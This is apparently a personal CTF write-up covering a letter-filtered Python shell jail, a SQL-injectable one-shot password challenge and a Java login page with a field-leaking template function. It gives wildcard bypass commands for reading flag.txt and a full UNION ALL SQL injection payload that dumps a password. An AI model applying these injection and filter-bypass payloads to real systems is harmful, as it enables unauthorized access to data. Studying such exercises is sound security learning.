# Jail
### sansomega
```python
#!/usr/local/bin/python3
import subprocess

BANNED = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\\"\'`:{}[]'


def shell():
    while True:
        cmd = input('$ ')
        if any(c in BANNED for c in cmd):
            print('Banned characters detected')
            exit(1)

        if len(cmd) >= 20:
            print('Command too long')
            exit(1)

        proc = subprocess.Popen(
            ["/bin/sh", "-c", cmd], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

        print(proc.stdout.read().decode('utf-8'), end='')

if __name__ == '__main__':
    shell()

```

没有过滤$(),数字,但是过滤了\\没法8进制执行
\* 可以构造出来flag.txt

`/*/*/*64 *` 会解析为/bin/base64 /bin/x86_64  flag.txt

---
base32!!!竟然有这个命令

`/*/*/????32 *.*`

另一个解法,使用diff3

`/*/????3 ./* ./???`

another
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240411222144.png)

### javajail1
```python
BANNED = ['import', 'class', 'Main', '{', '}']
```




# web
### one-shot
流程,new_session生成一个表(随机密码),search来匹配这个表里的字符且只能search一次,guess需要输入密码
```python
    query = db.execute(f"SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'")
```
search的query参数存在sql注入
```bash
' UNION ALL SELECT substr(password, 1, 1) FROM table_id UNION ALL SELECT substr(password, 2, 1) FROM table_id UNION ALL SELECT substr(password, 3, 1) FROM table_id UNION ALL SELECT substr(password, 4, 1) FROM table_id UNION ALL SELECT substr(password, 5, 1) FROM table_id UNION ALL SELECT substr(password, 6, 1) FROM table_id UNION ALL SELECT substr(password, 7, 1) FROM table_id UNION ALL SELECT substr(password, 8, 1) FROM table_id UNION ALL SELECT substr(password, 9, 1) FROM table_id UNION ALL SELECT substr(password, 10, 1) FROM table_id UNION ALL SELECT substr(password, 11, 1) FROM table_id UNION ALL SELECT substr(password, 12, 1) FROM table_id UNION ALL SELECT substr(password, 13, 1) FROM table_id UNION ALL SELECT substr(password, 14, 1) FROM table_id UNION ALL SELECT substr(password, 15, 1) FROM table_id UNION ALL SELECT substr(password, 16, 1) FROM table_id UNION ALL SELECT substr(password, 17, 1) FROM table_id UNION ALL SELECT substr(password, 18, 1) FROM table_id UNION ALL SELECT substr(password, 19, 1) FROM table_id UNION ALL SELECT substr(password, 20, 1) FROM table_id UNION ALL SELECT substr(password, 21, 1) FROM table_id UNION ALL SELECT substr(password, 22, 1) FROM table_id UNION ALL SELECT substr(password, 23, 1) FROM table_id UNION ALL SELECT substr(password, 24, 1) FROM table_id UNION ALL SELECT substr(password, 25, 1) FROM table_id UNION ALL SELECT substr(password, 26, 1) FROM table_id UNION ALL SELECT substr(password, 27, 1) FROM table_id UNION ALL SELECT substr(password, 28, 1) FROM table_id UNION ALL SELECT substr(password, 29, 1) FROM table_id UNION ALL SELECT substr(password, 30, 1) FROM table_id UNION ALL SELECT substr(password, 31, 1) FROM table_id UNION ALL SELECT substr(password, 32, 1) FROM table_id ; --
```
返回所有password

### creative-login-page-challenge
登录/注册功能,登录成功会在cookie里加上name和一段加盐的hash校验

注册时可以用户名可以填入模板,获取字段名
```java
            String tUsername = template(username);

    private String template(String fmtStr) throws Exception {
        StringBuilder sb = new StringBuilder();
        while (fmtStr.contains("{{")) {
            int start = fmtStr.indexOf("{{") + 2;
            int end = fmtStr.indexOf("}}", start);
            if (end == -1) throw new Exception("Invalid Format String");
            sb.append(fmtStr, 0, start - 2);
            Field f = LoginpageApplication.class.getField(fmtStr.substring(start, end));
            if (f.getType().equals(String.class)) {
                sb.append(f.get(this));
            } else {
                throw new Exception("Field not found");
            }

            fmtStr = fmtStr.substring(end + 2);
        }
        // no format strings, no need.
        sb.append(fmtStr);
        return sb.toString();
    }
//给的字段
    private final static String SALT = BCrypt.gensalt();
    // Some fun things to include in your username/password!
    // TODO take from env cause yes
    public String flag = System.getenv("FLAG");
    public String randomNum = Integer.toString((int) (Math.random() * 100));
```
其中flag已被过滤
`            if (tUsername.contains(flag)) return "No flag >:( !";`
,只剩下randomNum可以
~~分析登录接口可知,用户名是否存在都返回Credentials wrong,但是状态码未修改,我们可以据此来获取randomNum的值~~
瞎扯,直接注册71用户不就行了,没办法判断
# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2024-04-11   21:16